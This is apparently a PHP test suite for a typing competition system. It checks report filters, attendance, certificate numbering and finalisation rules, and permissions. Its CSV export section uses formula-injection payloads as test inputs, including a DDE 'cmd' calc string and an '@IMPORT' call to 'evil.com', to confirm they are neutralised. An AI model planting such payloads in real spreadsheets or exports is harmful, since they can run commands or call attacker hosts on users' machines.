<?php
/**
 * Step 7 Automated Test Suite
 * Comprehensive verification of:
 * - Reports Center (Competition Results, Attendance, Course/Shift Analytics, Speed/Accuracy Dist, Errors, Security)
 * - Global Filter Engine (Competition, Course, Shift, Status, WPM/Accuracy thresholds)
 * - Secure CSV / Excel Export with Anti-Formula Injection Sanitization & UTF-8 BOM
 * - Individual Result Sheet (A4) & Compact Result Slip Layouts
 * - Certificate Management Engine (Unique Numbering, Snapshot Preservation, Policies A-E, Bulk Generation)
 * - Finalized vs Unfinalized Position Certificate Safeguards
 * - RBAC & Permissions
 */

echo "=== MICROSOFT INSTITUTE TYPING COMPETITION SYSTEM ===\n";
echo "=== STEP 7 — REPORTS, EXPORT & CERTIFICATES TEST SUITE ===\n\n";

$passed = 0;
$failed = 0;
$tests = [];

function test(string $name, bool $result, string $detail = '') {
    global $passed, $failed, $tests;
    if ($result) {
        $passed++;
        echo "[PASS] {$name}" . ($detail ? " — {$detail}" : '') . "\n";
    } else {
        $failed++;
        echo "[FAIL] {$name}" . ($detail ? " — {$detail}" : '') . "\n";
    }
    $tests[] = ['name' => $name, 'result' => $result, 'detail' => $detail];
}

require_once __DIR__ . '/../config/app.php';
require_once __DIR__ . '/../core/Database.php';
require_once __DIR__ . '/../core/Session.php';
require_once __DIR__ . '/../core/CSRF.php';
require_once __DIR__ . '/../core/AuditLog.php';
require_once __DIR__ . '/../core/Auth.php';
require_once __DIR__ . '/../core/Middleware.php';
require_once __DIR__ . '/../core/Validator.php';
require_once __DIR__ . '/../core/TypingCalculator.php';
require_once __DIR__ . '/../core/RankingService.php';
require_once __DIR__ . '/../core/ResultService.php';
require_once __DIR__ . '/../core/ReportService.php';
require_once __DIR__ . '/../core/CertificateService.php';
require_once __DIR__ . '/../core/helpers.php';

Session::start();
$pdo = Database::getInstance();

// Cleanup prior Step 7 test artifacts
Database::delete('candidates', "registration_number LIKE 'MITC-STEP7-%'");
Database::delete('competitions', "code LIKE 'STEP7-COMP-%'");

// ============================================================
// 1. DATABASE SCHEMA INTEGRITY (STEP 7)
// ============================================================
echo "\n--- 1. DATABASE SCHEMA INTEGRITY (STEP 7) ---\n";

function tableExists($pdo, $table) {
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = ?");
    $stmt->execute([$table]);
    return (bool)$stmt->fetchColumn();
}

function colExists($pdo, $table, $column) {
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = ? AND column_name = ?");
    $stmt->execute([$table, $column]);
    return (bool)$stmt->fetchColumn();
}

test('certificates table exists', tableExists($pdo, 'certificates'));
test('certificates.certificate_number column exists', colExists($pdo, 'certificates', 'certificate_number'));
test('certificates.net_wpm_snapshot column exists', colExists($pdo, 'certificates', 'net_wpm_snapshot'));
test('certificates.accuracy_snapshot column exists', colExists($pdo, 'certificates', 'accuracy_snapshot'));
test('certificates.score_snapshot column exists', colExists($pdo, 'certificates', 'score_snapshot'));

// ============================================================
// 2. REPORT GENERATION & GLOBAL FILTERS
// ============================================================
echo "\n--- 2. REPORT GENERATION & GLOBAL FILTERS ---\n";

$testCompCode = 'STEP7-COMP-' . time();
$testCompId = Database::insert('competitions', [
    'name'             => 'Step 7 Championship',
    'code'             => $testCompCode,
    'competition_date' => date('Y-m-d'),
    'start_time'       => '09:00:00',
    'end_time'         => '18:00:00',
    'status'           => 'active',
    'created_by'       => 1,
]);

// Register 4 test candidates
$c1 = Database::insert('candidates', ['competition_id' => $testCompId, 'registration_number' => 'MITC-STEP7-01', 'roll_number' => 'R-701', 'full_name' => 'Ali Khan', 'course' => 'DIT', 'shift' => 'Morning', 'status' => 'completed', 'registered_by' => 1]);
$c2 = Database::insert('candidates', ['competition_id' => $testCompId, 'registration_number' => 'MITC-STEP7-02', 'roll_number' => 'R-702', 'full_name' => 'Sara Noor', 'course' => 'DIT', 'shift' => 'Morning', 'status' => 'completed', 'registered_by' => 1]);
$c3 = Database::insert('candidates', ['competition_id' => $testCompId, 'registration_number' => 'MITC-STEP7-03', 'roll_number' => 'R-703', 'full_name' => 'Zubair Ahmed', 'course' => 'CIT', 'shift' => 'Evening', 'status' => 'completed', 'registered_by' => 1]);
$c4 = Database::insert('candidates', ['competition_id' => $testCompId, 'registration_number' => 'MITC-STEP7-04', 'roll_number' => 'R-704', 'full_name' => 'Bilal Shah', 'course' => 'CIT', 'shift' => 'Evening', 'status' => 'registered', 'registered_by' => 1]);

// Mark attendance
Database::insert('attendance', ['competition_id' => $testCompId, 'candidate_id' => $c1, 'status' => 'present', 'marked_by' => 1]);
Database::insert('attendance', ['competition_id' => $testCompId, 'candidate_id' => $c2, 'status' => 'present', 'marked_by' => 1]);
Database::insert('attendance', ['competition_id' => $testCompId, 'candidate_id' => $c3, 'status' => 'present', 'marked_by' => 1]);
Database::insert('attendance', ['competition_id' => $testCompId, 'candidate_id' => $c4, 'status' => 'absent', 'marked_by' => 1]);

// Insert attempts and results
$att1 = Database::insert('test_attempts', ['candidate_id' => $c1, 'competition_id' => $testCompId, 'paragraph_id' => 1, 'attempt_number' => 1, 'status' => 'completed', 'duration_seconds' => 300]);
$att2 = Database::insert('test_attempts', ['candidate_id' => $c2, 'competition_id' => $testCompId, 'paragraph_id' => 1, 'attempt_number' => 1, 'status' => 'completed', 'duration_seconds' => 300]);
$att3 = Database::insert('test_attempts', ['candidate_id' => $c3, 'competition_id' => $testCompId, 'paragraph_id' => 1, 'attempt_number' => 1, 'status' => 'completed', 'duration_seconds' => 300]);

$res1 = Database::insert('test_results', ['attempt_id' => $att1, 'candidate_id' => $c1, 'competition_id' => $testCompId, 'score' => 60.0, 'gross_wpm' => 62.0, 'net_wpm' => 61.22, 'accuracy' => 98.0, 'error_count' => 1, 'qualification_status' => 'qualified', 'rank' => 1]);
$res2 = Database::insert('test_results', ['attempt_id' => $att2, 'candidate_id' => $c2, 'competition_id' => $testCompId, 'score' => 45.0, 'gross_wpm' => 50.0, 'net_wpm' => 47.37, 'accuracy' => 95.0, 'error_count' => 3, 'qualification_status' => 'qualified', 'rank' => 2]);
$res3 = Database::insert('test_results', ['attempt_id' => $att3, 'candidate_id' => $c3, 'competition_id' => $testCompId, 'score' => 20.0, 'gross_wpm' => 30.0, 'net_wpm' => 25.00, 'accuracy' => 80.0, 'error_count' => 6, 'qualification_status' => 'not_qualified', 'rank' => 3]);

// Test 2.1: Competition Results Report
$compResults = ReportService::getCompetitionResults(['competition_id' => $testCompId]);
test('Competition results report returned 3 records', count($compResults) === 3);

// Test 2.2: Filter by Course
$ditResults = ReportService::getCompetitionResults(['competition_id' => $testCompId, 'course' => 'DIT']);
test('Filter by Course (DIT) returned exactly 2 records', count($ditResults) === 2);

// Test 2.3: Filter by Qualification Status
$qualResults = ReportService::getCompetitionResults(['competition_id' => $testCompId, 'qualification_status' => 'qualified']);
test('Filter by Qualification (qualified) returned exactly 2 records', count($qualResults) === 2);

// Test 2.4: Filter by Min WPM
$fastResults = ReportService::getCompetitionResults(['competition_id' => $testCompId, 'min_wpm' => 50.0]);
test('Filter by Min WPM (>= 50) returned exactly 1 record', count($fastResults) === 1 && $fastResults[0]['candidate_name'] === 'Ali Khan');

// Test 2.5: Attendance Report
$attReport = ReportService::getAttendanceReport(['competition_id' => $testCompId]);
test('Attendance report returned all 4 registered candidates', count($attReport) === 4);

$absentCandidates = array_filter($attReport, fn($a) => $a['attendance_status'] === 'absent');
test('Attendance report correctly identified 1 absent candidate', count($absentCandidates) === 1);

// Test 2.6: Grouped Analytics (Course)
$courseAnalytics = ReportService::getGroupedAnalytics('course', ['competition_id' => $testCompId]);
test('Course analytics grouped into 2 distinct courses (DIT, CIT)', count($courseAnalytics) === 2);

// Test 2.7: Speed & Accuracy Distributions
$wpmDist = ReportService::getWpmDistribution(['competition_id' => $testCompId]);
test('WPM distribution returned valid speed brackets', count($wpmDist) > 0);

$accDist = ReportService::getAccuracyDistribution(['competition_id' => $testCompId]);
test('Accuracy distribution returned valid accuracy brackets', count($accDist) > 0);

// ============================================================
// 3. SECURE CSV EXPORT & FORMULA INJECTION PREVENTION
// ============================================================
echo "\n--- 3. SECURE CSV EXPORT & ANTI-FORMULA INJECTION ---\n";

// Test formula injection characters: =, +, -, @, \t, \r
$val1 = ReportService::sanitizeCsvValue("=SUM(A1:A10)");
test("Formula starting with '=' sanitized with prepended apostrophe", $val1 === "'=SUM(A1:A10)");

$val2 = ReportService::sanitizeCsvValue("+12345");
test("Value starting with '+' sanitized with prepended apostrophe", $val2 === "'+12345");

$val3 = ReportService::sanitizeCsvValue("-cmd|' /C calc'!A0");
test("Value starting with '-' sanitized with prepended apostrophe", $val3 === "'-cmd|' /C calc'!A0");

$val4 = ReportService::sanitizeCsvValue("@IMPORT('http://evil.com')");
test("Value starting with '@' sanitized with prepended apostrophe", $val4 === "'@IMPORT('http://evil.com')");

$valNormal = ReportService::sanitizeCsvValue("Ali Khan");
test("Harmless alphanumeric string remains unaltered", $valNormal === "Ali Khan");

// ============================================================
// 4. CERTIFICATE MANAGEMENT & NUMBERING ENGINE
// ============================================================
echo "\n--- 4. CERTIFICATES & BULK GENERATION ---\n";

// Test 4.1: Unique Certificate Number Format
$certNum1 = CertificateService::generateCertificateNumber();
$expectedPrefix = "MITC-CERT-" . date('Y') . "-";
test("Certificate number generated with format MITC-CERT-YYYY-XXXXX ({$certNum1})", strpos($certNum1, $expectedPrefix) === 0);

// Test 4.2: Position certificate blocked when competition not finalized
$blockedException = false;
try {
    CertificateService::generateCertificate($c1, $testCompId, 'position', 1);
} catch (Exception $e) {
    $blockedException = true;
}
test('Position certificate generation blocked before competition finalization', $blockedException);

// Finalize competition
RankingService::finalizeCompetition($testCompId, 1);

// Test 4.3: Position certificate generation succeeded after finalization
$posCert = CertificateService::generateCertificate($c1, $testCompId, 'position', 1);
test('Position certificate generated successfully after finalization', $posCert['status'] === 'generated');

// Test 4.4: Snapshot values preserved on certificate record
$certRecord = CertificateService::getCertificate($posCert['certificate_id']);
test('Certificate preserved net_wpm_snapshot = 61.22', (float)$certRecord['net_wpm_snapshot'] === 61.22);
test('Certificate preserved accuracy_snapshot = 98.00', (float)$certRecord['accuracy_snapshot'] === 98.00);
test('Certificate assigned position title "1st Position"', $certRecord['position'] === '1st Position');

// Test 4.5: Duplicate certificate prevention
$dupCert = CertificateService::generateCertificate($c1, $testCompId, 'position', 1);
test('Duplicate certificate generation prevented (status = already_exists)', $dupCert['status'] === 'already_exists');

// Test 4.6: Bulk generation for Qualified candidates (Mode D)
$bulkRes = CertificateService::bulkGenerate($testCompId, 'all_qualified', [], 1);
test('Bulk generation generated participation cert for candidate 2 and skipped candidate 1', $bulkRes['status'] === 'success' && $bulkRes['generated'] >= 1);

// ============================================================
// 5. RBAC & PERMISSIONS VERIFICATION
// ============================================================
echo "\n--- 5. RBAC PERMISSIONS VERIFICATION ---\n";

$step7Perms = ['reports.view', 'reports.export', 'certificates.view', 'certificates.generate', 'certificates.print'];
$permsOk = true;
foreach ($step7Perms as $perm) {
    $exists = Database::fetch("SELECT id FROM permissions WHERE slug = ?", [$perm]);
    if (!$exists) $permsOk = false;
}
test('All Step 7 permissions exist in database', $permsOk);

// Cleanup test records
Database::delete('certificates', 'competition_id = ?', [$testCompId]);
Database::delete('test_results', 'competition_id = ?', [$testCompId]);
Database::delete('test_attempts', 'competition_id = ?', [$testCompId]);
Database::delete('attendance', 'competition_id = ?', [$testCompId]);
Database::delete('candidates', 'competition_id = ?', [$testCompId]);
Database::delete('competitions', 'id = ?', [$testCompId]);

echo "\n============================================================\n";
echo "STEP 7 TESTS SUMMARY: {$passed} PASSED / {$failed} FAILED\n";
echo "============================================================\n";

if ($failed > 0) {
    exit(1);
}
exit(0);
